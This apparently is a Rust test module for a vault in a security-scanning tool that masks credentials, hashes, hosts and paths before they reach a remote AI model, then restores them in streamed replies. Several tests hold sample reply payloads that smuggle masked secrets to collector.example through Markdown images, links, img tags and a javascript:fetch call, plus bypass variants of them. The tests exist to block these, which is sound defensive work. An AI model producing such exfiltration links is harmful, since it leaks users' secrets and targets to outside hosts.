    fn a_certificate_cannot_make_requests_fail_or_mask_plain_words() {
        // A scanned server names itself after words of the request.
        let mut graph = Graph::default();
        for san in ["task", "port", "state", "nginx", "dc01"] {
            graph.apply(Observation::TlsSan {
                address: "10.10.10.5".into(),
                port: 443,
                san: san.into(),
                record: EvidenceRecord::observed(Source::TlsSan, Confidence::High, "x"),
            });
        }
        let mut vault = Vault::ephemeral();
        vault.register_graph(&graph);
        let document = json!({
            "task": "triage",
            "ports": [{ "port": "443/tcp", "state": "open", "product": "nginx on dc01" }],
            // Escaped in the document's text, this value would look longer.
            "claim": "pwd:ab\" quoted",
        });
        let masked = vault.mask_json(&document);
        assert_eq!(masked["task"], "triage");
        assert_eq!(masked["ports"][0]["state"], "open");
        assert_eq!(masked["ports"][0]["product"], "nginx on <<DOM_01>>");
        assert!(vault.leaks_json(&masked).is_empty(), "{masked}");
        // What masking leaves where a value was is not a leak either.
        let masked =
            vault.mask_json(&json!({ "c": "{\"password\": \"hunter22\"}; Cookie: sid=abc123def" }));
        assert!(vault.leaks_json(&masked).is_empty(), "{masked}");
        assert!(!masked.to_string().contains("hunter22"));
    }

    #[test]
    fn masking_stays_fast_with_many_names_in_the_vault() {
        let mut vault = Vault::ephemeral();
        for index in 0..20_000 {
            vault.register(Kind::Dom, &format!("host{index}"));
            vault.register(Kind::User, &format!("user{index}"));
        }
        let text =
            "plain words and numbers 12345 with host777 and user19999 in between. ".repeat(40);
        let document = Value::Array((0..300).map(|_| json!(text)).collect());
        let started = std::time::Instant::now();
        let masked = vault.mask_json(&document).to_string();
        assert!(started.elapsed() < std::time::Duration::from_secs(10));
        assert!(!masked.contains("host777") && !masked.contains("user19999"));
    }

    #[test]
    fn common_secret_formats_do_not_pass() {
        // What the 2026-11 audit saw arrive at a stand-in cloud in clear.
        let cases: &[(&str, &[&str])] = &[
            (
                "DB_PASSWORD=Sup3rS3cret!x MYSQL_ROOT_PASSWORD=r00tpw99 SMTP_PASS=mailpw77 \
                 APP_SECRET=s3cr3tvalue1 API_TOKEN=tok_live_12345",
                &["Sup3rS3cret!x", "r00tpw99", "mailpw77", "s3cr3tvalue1", "tok_live_12345"],
            ),
            (
                "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
                &["wJalrXUtnFEMI", "K7MDENG", "bPxRfiCYEXAMPLEKEY"],
            ),
            // The same key with nothing naming it.
            (
                "found wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY in the page source",
                &["wJalrXUtnFEMI", "K7MDENG", "bPxRfiCYEXAMPLEKEY"],
            ),
            ("passphrase: correcthorse99", &["correcthorse99"]),
            ("PHPSESSID=9f2c1a77b1d04e2aa3c1", &["9f2c1a77b1d04e2aa3c1"]),
            ("JSESSIONID: 0A1B2C3D4E5F", &["0A1B2C3D4E5F"]),
            (
                "/cb?session_token=9a8b7c6d5e&reset_password_token=zz11yy22",
                &["9a8b7c6d5e", "zz11yy22"],
            ),
            // An LM / NTLM pair, and one hash alone.
            (
                "Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::",
                &["aad3b435b51404ee", "8846f7eaee8fb117ad06bdd830b7586c"],
            ),
            ("hash 5f4dcc3b5aa765d61d8327deb882cf99 seen", &["5f4dcc3b5aa765d61d8327deb882cf99"]),
            ("etag 9f2c1a77b1d04e2aa3c1 short hex", &["9f2c1a77b1d04e2aa3c1"]),
            (
                "root:$6$rounds=5000$saltsalt$Hx3bT0d5q1ZyVQkq9nD0wq7uYbXnJw1:19000:0:99999:7:::",
                &["saltsalt", "Hx3bT0d5q1ZyVQkq9nD0wq7uYbXnJw1"],
            ),
            ("$2b$12$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy", &["N9qo8uLOickgx2ZMRZoMye"]),
            ("config: {\"dbPassword\": \"p@ss w0rd!\", \"clientSecret\":\"abc123xyz\"}", &["p@ss w0rd!", "abc123xyz"]),
            ("password = 'two words here'", &["two words here"]),
            ("pwd=abc", &["abc"]),
            ("GET /api?key=AbC123xYz&sig=deadbeef01&page=2", &["AbC123xYz", "deadbeef01"]),
            ("apiKey: 123e4567-e89b-12d3-a456-426614174000", &["123e4567", "426614174000"]),
            ("session 123e4567-e89b-12d3-a456-426614174000 opened", &["426614174000"]),
            ("ENCRYPTION_KEY=hunter2hunter2", &["hunter2hunter2"]),
            ("vault.credentials: s3cr3t-cr3d", &["s3cr3t-cr3d"]),
        ];
        for (text, secrets) in cases {
            let mut vault = Vault::ephemeral();
            let masked = vault.mask_text(text);
            for secret in *secrets {
                assert!(!masked.contains(secret), "{secret} survived in: {masked}");
            }
            assert!(masked.contains("<<SEC_"), "{masked}");
            assert_eq!(vault.unmask(&masked), *text);
            assert!(!vault.exposed_secrets().is_empty());
        }
    }

    #[test]
    fn words_that_only_contain_a_secret_word_are_left_alone() {
        let mut vault = Vault::ephemeral();
        for plain in [
            "compass: north-east",
            "bypass=true and passive: enabled",
            "tokens: 1500 used, tokenizer=default",
            "secretary: on leave",
            "Public Key type: rsa, Public Key bits: 2048",
            "ssh-hostkey: 2048 (RSA)",
            "see vuln/detail/CVE-2021-23017 and Discovery/Web-Content/raft-medium-directories",
            "wp-content/uploads/2023/05/Annual-Report-2023-final and images/2021/Q3/Board-Meeting-Photo-0042",
            "org/apache/logging/log4j/core/lookup/JndiLookup, apache/logging-log4j2/pull/608/files",
            "X-Content-Type-Options and Strict-Transport-Security are missing",
            "deadbeefdeadbeefdeadbeef is a test pattern",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        ] {
            assert_eq!(vault.mask_text(plain), plain, "{plain}");
        }
        assert!(vault.exposed_secrets().is_empty());
        for (word, like) in [
            ("report", true),
            ("CVE", true),
            ("Report2023", true),
            ("JndiLookup", true),
            ("XMLHttpRequest", true),
            ("0042", true),
            ("K7MDENG", false),
            ("wJalrXUtnFEMI", false),
            ("bPxRfiCYEXAMPLEKEY", false),
            ("log4j2", false),
        ] {
            assert_eq!(is_wordlike(word), like, "{word}");
        }
    }

    #[test]
    fn ordinary_long_words_are_not_secrets() {
        let mut vault = Vault::ephemeral();
        for plain in [
            "getElementsByClassNameAndTagNameNS",
            "raft-medium-directories-lowercase",
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1",
            "ThisIsAVeryLongButPerfectlyOrdinaryIdentifier",
            "the quick brown fox jumps over the lazy dog 1234567890",
        ] {
            assert_eq!(vault.mask_text(plain), plain, "{plain}");
        }
        assert!(vault.exposed_secrets().is_empty());
        assert!(entropy("aaaaaaaa") < 0.01);
        assert!(entropy("7f3d9a1c5b2e8f4a6d0c9b7e1a3f5d2c8e4b6a0f") > ENTROPY_MIN_BITS);
        assert_eq!(base64_decode("dXNlcjpwYXNz").unwrap(), b"user:pass");
        assert_eq!(
            base64_decode("dXNlcjpwYXNzd29yZDEyMw==").unwrap(),
            b"user:password123"
        );
        assert!(base64_decode("not base64!").is_none());
    }

    #[test]
    fn text_that_already_looks_like_a_placeholder_survives_the_round_trip() {
        let mut vault = Vault::ephemeral();
        vault.register(Kind::Host, "10.0.0.5");
        // The scanned page itself contained "<<HOST_01>>".
        let text = "banner says <<HOST_01>> but the host is 10.0.0.5";
        let masked = vault.mask_text(text);
        assert_eq!(masked, "banner says <<LIT_01>> but the host is <<HOST_01>>");
        assert_eq!(vault.unmask(&masked), text);
        // Unknown placeholders in a reply are not invented into values.
        assert_eq!(
            vault.unmask("see <<HOST_99>> and <<FOO_01>>"),
            "see <<HOST_99>> and <<FOO_01>>"
        );
    }

    #[test]
    fn only_json_string_values_are_masked() {
        let mut vault = vault_with_lab();
        let document = json!({
            "host": "10.10.10.5",
            "10.10.10.5": "a key that happens to be an address",
            "ports": [ { "number": 443, "server": "nginx/1.18.0", "names": ["app.corp-acme.com"] } ],
            "open": true,
            "note": "password=hunter2 for alice@corp-acme.com",
            "count": 10
        });
        let masked = vault.mask_json(&document);
        assert_eq!(
            masked,
            json!({
                "host": "<<HOST_01>>",
                "10.10.10.5": "a key that happens to be an address",
                "ports": [ { "number": 443, "server": "nginx/1.18.0", "names": ["<<DOM_01>>"] } ],
                "open": true,
                "note": "password=<<SEC_01>> for <<USER_01>>@<<DOM_03>>",
                "count": 10
            })
        );
        // Structure is intact: it serialises to valid JSON of the same shape.
        let text = serde_json::to_string(&masked).unwrap();
        assert!(serde_json::from_str::<Value>(&text).is_ok());
        // The leak check catches a sensitive value used as a key.
        assert_eq!(vault.leaks(&text), ["HOST"]);
    }

    #[test]
    fn longest_match_wins_over_overlapping_shorter_ones() {
        let mut vault = Vault::ephemeral();
        // The whole key block is one secret, not a path plus fragments.
        let key = "-----BEGIN RSA PRIVATE KEY-----\nMIIEow/var/tmp/x10.0.0.5IBAAKCAQEA\n-----END RSA PRIVATE KEY-----";
        assert_eq!(vault.mask_text(key), "<<SEC_01>>");
        // A URL with credentials: user, secret and host are separate spans.
        assert_eq!(
            vault.mask_text("ftp://backup:Tr0ub4dor&3@10.0.0.9/dump.sql"),
            "ftp://<<USER_01>>:<<SEC_02>>@<<HOST_01>>/dump.sql"
        );
        assert_eq!(vault.len(), 4);
    }

    #[test]
    fn streamed_replies_are_unmasked_across_chunk_boundaries() {
        let mut vault = Vault::ephemeral();
        vault.register(Kind::Host, "10.0.0.5");
        vault.register(Kind::Dom, "app.lab.local");
        let reply = "Block <<HOST_01>> at the edge; <<DOM_01>> serves a < b and x << 3 >> y; unknown <<HOST_77>>.";
        let expected = "Block 10.0.0.5 at the edge; app.lab.local serves a < b and x << 3 >> y; unknown <<HOST_77>>.";

        // The request held both placeholders.
        let request = "about <<HOST_01>> and <<DOM_01>>";
        // Every possible split into two chunks, and byte-at-a-time.
        for cut in 0..=reply.len() {
            let mut stream = vault.stream_for(request);
            let mut out = stream.push(&reply[..cut]);
            out.push_str(&stream.push(&reply[cut..]));
            out.push_str(&stream.finish());
            assert_eq!(out, expected, "cut at {cut}");
        }
        let mut stream = vault.stream_for(request);
        let mut out = String::new();
        for ch in reply.chars() {
            let piece = stream.push(&ch.to_string());
            // A half-received placeholder is never shown.
            assert!(
                !piece.contains("<<HOST_0") || piece.contains("<<HOST_77>>"),
                "{piece}"
            );
            out.push_str(&piece);
        }
        out.push_str(&stream.finish());
        assert_eq!(out, expected);

        // A lone "<<" that never closes is released with its word.
        let mut stream = vault.stream_for(request);
        let mut out = stream.push("shift <<");
        assert_eq!(out, "shift ");
        out.push_str(&stream.push(" by a very long expression that is no placeholder"));
        out.push_str(&stream.finish());
        assert_eq!(
            out,
            "shift << by a very long expression that is no placeholder"
        );
        // A run without any space is let go once it is long, whole
        // placeholders only.
        let mut stream = vault.stream_for(request);
        let long = format!(
            "{}<<HOST_01>>{}",
            "a".repeat(MAX_WORD),
            "b".repeat(MAX_WORD)
        );
        let mut out = String::new();
        for piece in long.as_bytes().chunks(7) {
            out.push_str(&stream.push(std::str::from_utf8(piece).unwrap()));
        }
        out.push_str(&stream.finish());
        assert_eq!(out, long.replace("<<HOST_01>>", "10.0.0.5"));
    }

    #[test]
    fn a_reply_gets_back_only_what_its_request_held() {
        let mut vault = Vault::ephemeral();
        vault.register(Kind::Host, "10.0.0.5");
        vault.register(Kind::Sec, "hunter2-from-another-host");
        vault.register(Kind::User, "auditor");
        // The request named the host only; the reply guesses at the rest.
        let mut stream = vault.stream_for("{\"address\":\"<<HOST_01>>\"}");
        let mut out = stream.push("On <<HOST_01>> try <<SEC_01>> as <<USER_01>> and <<SEC_02>>.");
        out.push_str(&stream.finish());
        assert_eq!(
            out,
            "On 10.0.0.5 try <<SEC_01>> as <<USER_01>> and <<SEC_02>>."
        );
    }

    #[test]
    fn a_placeholder_inside_a_link_to_elsewhere_is_not_filled_in() {
        let mut vault = Vault::ephemeral();
        vault.register(Kind::Host, "10.0.0.5");
        vault.register(Kind::Dom, "vpn.victim-corp.internal");
        vault.register(Kind::Sec, "Winter2026!x");
        vault.register(Kind::Path, "/home/auditor/loot/id_rsa");
        let request = "<<HOST_01>> <<DOM_01>> <<SEC_01>> <<PATH_01>>";
        let unmask = |reply: &str| {
            // Whole, and a byte at a time.
            let mut stream = vault.stream_for(request);
            let mut whole = stream.push(reply);
            whole.push_str(&stream.finish());
            let mut stream = vault.stream_for(request);
            let mut pieces = String::new();
            for ch in reply.chars() {
                pieces.push_str(&stream.push(&ch.to_string()));
            }
            pieces.push_str(&stream.finish());
            assert_eq!(whole, pieces, "{reply}");
            whole
        };
        // Links, images and attributes that point somewhere else keep their
        // placeholders, wherever in the address they stand.
        for hostile in [
            "![status](https://collector.example/p.png?v0=<<DOM_01>>&v1=<<HOST_01>>&v5=<<SEC_01>>)",
            "[fix](https://collector.example/<<PATH_01>>)",
            "[ref]: https://collector.example/?a=<<SEC_01>>",
            "see https://<<SEC_01>>.collector.example/x and https://<<HOST_01>>.collector.example/",
            "https://<<HOST_01>>@collector.example/ or https://<<HOST_01>>:<<SEC_01>>@collector.example/",
            "//collector.example/?u=http://<<HOST_01>>/",
            "https://collector.example/?next=https://<<HOST_01>>/",
            "<img src=//collector.example/<<SEC_01>>>",
            "www.collector.example/<<SEC_01>>",
            "![x](//collector.example/<<SEC_01>>)",
            "https://<<SEC_01>>/",
        ] {
            let shown = unmask(hostile);
            assert_eq!(shown, hostile, "nothing may be filled in");
        }
        // A link to the target itself is the user's own, and plain text
        // gets its values back.
        assert_eq!(
            unmask("Open https://<<HOST_01>>/admin and http://<<DOM_01>>:8443/login?next=<<PATH_01>>, then http://[<<HOST_01>>]/."),
            "Open https://10.0.0.5/admin and http://vpn.victim-corp.internal:8443/login?next=/home/auditor/loot/id_rsa, then http://[10.0.0.5]/."
        );
        assert_eq!(
            unmask("The password <<SEC_01>> opened <<PATH_01>> on <<HOST_01>> (<<DOM_01>>)."),
            "The password Winter2026!x opened /home/auditor/loot/id_rsa on 10.0.0.5 (vpn.victim-corp.internal)."
        );
    }

    #[test]
    fn placeholders_persist_in_state_db() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("state.db");
        let masked = {
            let db = Arc::new(Mutex::new(Db::open(&path).unwrap()));
            let mut vault = Vault::open(db).unwrap();
            assert!(vault.is_empty());
            vault.mask_text("10.0.0.5 then 10.0.0.9 with token=abcdef123456")
        };
        assert_eq!(masked, "<<HOST_01>> then <<HOST_02>> with token=<<SEC_01>>");

        // A later session reuses the numbering and can unmask old replies.
        let db = Arc::new(Mutex::new(Db::open(&path).unwrap()));
        let mut vault = Vault::open(Arc::clone(&db)).unwrap();
        assert_eq!(vault.len(), 3);
        assert_eq!(vault.unmask("<<HOST_02>>"), "10.0.0.9");
        assert_eq!(
            vault.mask_text("10.0.0.9 and 10.0.0.77"),
            "<<HOST_02>> and <<HOST_03>>"
        );
        assert_eq!(vault.exposed_secrets().len(), 1);
        let exposed: i64 = db
            .lock()
            .unwrap()
            .conn()
            .query_row("SELECT COUNT(*) FROM vault WHERE exposed = 1", [], |row| {
                row.get(0)
            })
            .unwrap();
        assert_eq!(exposed, 1);
    }

    #[test]
    fn http_redirect_hostnames_and_expanded_api_keys_are_vaulted() {
        let mut graph = Graph::default();
        let rec = EvidenceRecord::observed(Source::NmapXml, Confidence::High, "x");
        graph.apply(Observation::Port {
            address: "198.51.100.10".into(),
            port: 443,
            protocol: "tcp".into(),
            state: "open".into(),
            service: Some("https".into()),
            product: Some("nginx".into()),
            version: Some("1.18.0".into()),
            extra_info: None,
            cpes: vec![],
            record: rec,
        });
        graph
            .hosts
            .get_mut("198.51.100.10")
            .unwrap()
            .ports
            .get_mut("443/tcp")
            .unwrap()
            .http = Some(crate::graph::HttpInfo {
            scheme: "https".into(),
            server: None,
            location: Some("https://sso.example.net/login".into()),
            ..crate::graph::HttpInfo::default()
        });

        let mut vault = Vault::ephemeral();
        vault.register_graph(&graph);
        let masked_redirect = vault
            .mask_text("HTTP 302 Location: https://sso.example.net/login and auth.example.net");
        assert!(
            !masked_redirect.contains("sso.example.net")
                && !masked_redirect.contains("auth.example.net"),
            "redirect domain and sibling domain should be vaulted: {masked_redirect}"
        );

        for secret in [
            "sk-ant-api03-short_key_token_1234",
            "sk-or-v1-a1b2c3d4e5f6a1b2c3d4",
            "sk-proj-a1b2c3d4e5f6a1b2c3d4",
            "ghp_shorttoken1234567890abcd",
            "glpat-short_gitlab_pat_12345",
        ] {
            let masked = vault.mask_text(&format!("using {secret} in output"));
            assert!(
                !masked.contains(secret) && masked.contains("<<SEC_"),
                "secret {secret} was not masked: {masked}"
            );
        }

        // StreamUnmasker only unmasks tokens present in the request, and never inside external links.
        let mut stream = vault.stream_for("inspect <<DOM_01>>");
        let streamed = format!(
            "{}{}",
            stream.push("keep <<SEC_01>> redacted on <<DOM_01>>"),
            stream.finish()
        );
        assert_eq!(streamed, "keep <<SEC_01>> redacted on sso.example.net");

        // Colon-prefixed IPv6 and IPv4-mapped IPv6 are completely masked.
        assert_eq!(
            vault.mask_text("target:2001:db8::1 and ::ffff:10.0.0.1"),
            "target:<<HOST_02>> and <<HOST_03>>"
        );
    }

    #[test]
    fn ipv6_port_custom_auth_paths_and_public_suffixes_are_handled() {
        let mut graph = Graph::default();
        let rec = EvidenceRecord::observed(Source::TlsSan, Confidence::High, "x");
        for san in ["portal.corp.co.uk", "preview.github.io"] {
            graph.apply(Observation::TlsSan {
                address: "198.51.100.20".into(),
                port: 443,
                san: san.into(),
                record: rec.clone(),
            });
        }

        let mut vault = Vault::ephemeral();
        vault.register_graph(&graph);
        vault.register(Kind::Host, "2001:db8::1");

        // Unbracketed IPv6 with trailing port is masked without dropping the port.
        assert_eq!(
            vault.mask_text(
                "connect fe80::1:65535 and 2001:db8:1:2:3:4:5:6:8080 and 2001:db8::1:8080 and [fd00::9]:22"
            ),
            "connect <<HOST_03>>:65535 and <<HOST_04>>:8080 and <<HOST_02>>:8080 and [<<HOST_05>>]:22"
        );

        // Multi-label public suffixes: corp.co.uk is registered as internal suffix,
        // while co.uk and github.io themselves are never registered as internal suffixes.
        assert!(vault.suffixes.contains("corp.co.uk"));
        assert!(!vault.suffixes.contains("co.uk"));
        assert!(!vault.suffixes.contains("github.io"));
        let domains = vault.mask_text(
            "seen /vendor/api.corp.co.uk and preview.github.io, path /vendor/bbc.co.uk and /vendor/docs.github.io",
        );
        assert!(!domains.contains("api.corp.co.uk"), "{domains}");
        assert!(!domains.contains("preview.github.io"), "{domains}");
        assert!(domains.contains("/vendor/bbc.co.uk"), "{domains}");
        assert!(domains.contains("/vendor/docs.github.io"), "{domains}");

        // Custom Authorization schemes, JSON Cookie, and multi-word quoted secrets.
        for sample in [
            "Authorization: ApiKey secret-api-key-value-1234",
            "Authorization: AWS4-HMAC-SHA256 Credential=AKIAIOSFODNN7EXAMPLE/20261114/us-east-1/s3/aws4_request",
            "\"cookie\": \"sid=supersecretcookievalue\"",
            "password=\"correct horse battery staple\"",
        ] {
            let masked = vault.mask_text(sample);
            assert!(
                masked.contains("<<SEC_"),
                "expected secret placeholder in: {masked}"
            );
            assert!(!masked.contains("correct horse"), "{masked}");
            assert!(!masked.contains("supersecretcookievalue"), "{masked}");
        }

        // macOS /private, Linux /run & /proc, Windows C:/..., and UNC \\server\share paths.
        let paths = vault.mask_text(
            "files /private/etc/hosts /run/secrets/db C:/Users/alice/notes.txt \\\\fileserver\\share\\doc.txt",
        );
        for raw in [
            "/private/etc/hosts",
            "/run/secrets/db",
            "C:/Users/alice/notes.txt",
            "\\\\fileserver\\share\\doc.txt",
        ] {
            assert!(!paths.contains(raw), "{raw} leaked in: {paths}");
        }
    }

    #[test]
    fn stream_unmasker_blocks_piggybacked_schemeless_html_and_oversized_link_bypasses() {
        let mut vault = Vault::ephemeral();
        vault.register(Kind::Host, "10.0.0.5");
        vault.register(Kind::Dom, "vpn.victim-corp.internal");
        vault.register(Kind::Sec, "Winter2026!x");
        vault.register(Kind::Path, "/home/auditor/loot/id_rsa");
        let request = "<<HOST_01>> <<DOM_01>> <<SEC_01>> <<PATH_01>>";

        let run_both = |reply: &str| {
            let mut stream = vault.stream_for(request);
            let mut whole = stream.push(reply);
            whole.push_str(&stream.finish());

            let mut stream = vault.stream_for(request);
            let mut chunked = String::new();
            for ch in reply.chars() {
                chunked.push_str(&stream.push(&ch.to_string()));
            }
            chunked.push_str(&stream.finish());
            assert_eq!(whole, chunked, "split invariance failed for: {reply}");
            whole
        };

        let oversized_external = format!(
            "![p](https://collector.example/?pad={}&s=<<SEC_01>>)",
            "a".repeat(MAX_WORD + 200)
        );
        let split_marker_external = format!(
            "{}https://collector.example/?s=<<SEC_01>>",
            "a".repeat(MAX_WORD - 2)
        );

        for bypass in [
            "[ok](https://<<HOST_01>>/)![leak](https://collector.example/<<SEC_01>>)",
            "[x](mailto:evil@collector.example?b=https://<<HOST_01>>&s=<<SEC_01>>)",
            "https://<<DOM_01>>..collector.example/?s=<<SEC_01>>",
            "![autofetch](https://<<HOST_01>>/admin?s=<<SEC_01>>)",
            "https://<<HOST_01>>//collector.example/<<SEC_01>>",
            "[x]( https://collector.example/<<SEC_01>> )",
            "[x]( /collector/<<SEC_01>> )",
            "[x]( <https://collector.example/path with space/<<SEC_01>>> )",
            "[ref]: /collector/<<SEC_01>>",
            "[two words]: https://collector.example/<<SEC_01>>",
            "<img src = \"https://collector.example/p.png\" alt=\"<<SEC_01>>\">",
            "<img alt=\"1 > 0\" src=\"https://collector.example/<<SEC_01>>\">",
            "<a href=\"javascript:fetch('//collector.example/<<SEC_01>>')\">x</a>",
            oversized_external.as_str(),
            split_marker_external.as_str(),
        ] {
            let out = run_both(bypass);
            assert_eq!(out, bypass, "bypass leaked secret in: {bypass}");
            assert!(!out.contains("Winter2026!x"));
            assert!(!out.contains("10.0.0.5"));
        }

        // Mid-line `[1]:` prose, own-host Markdown links, and prose after closed tags still unmask.
        assert_eq!(
            run_both("Note [1]: <<HOST_01>> is open; [admin](https://<<HOST_01>>/admin) and <img src=\"//collector.example/x\"> then <<DOM_01>>."),
            "Note [1]: 10.0.0.5 is open; [admin](https://10.0.0.5/admin) and <img src=\"//collector.example/x\"> then vpn.victim-corp.internal."
        );
    }

    #[test]
    fn learned_public_suffix_and_db_pruning_preserve_exposed_secrets() {
        let mut vault = Vault::ephemeral();
        let masked = vault
            .mask_text("FQDN: corp.co.uk and /vendor/internal.corp.co.uk vs /vendor/bbc.co.uk");
        assert!(vault.suffixes.contains("corp.co.uk"));
        assert!(!vault.suffixes.contains("co.uk"));
        assert!(!masked.contains("internal.corp.co.uk"), "{masked}");
        assert!(masked.contains("/vendor/bbc.co.uk"), "{masked}");

        let dir = tempfile::tempdir().unwrap();
        let db = Arc::new(Mutex::new(Db::open(&dir.path().join("state.db")).unwrap()));
        {
            let mut backed = Vault::open(Arc::clone(&db)).unwrap();
            backed.register(Kind::Sec, "sk-live-persist-secret-1234567890");
            backed.register(Kind::Host, "10.99.0.1");
        }
        let reopened = Vault::open(db).unwrap();
        assert_eq!(reopened.exposed_secrets().len(), 1);
        assert_eq!(reopened.unmask("<<HOST_01>>"), "10.99.0.1");
    }
}
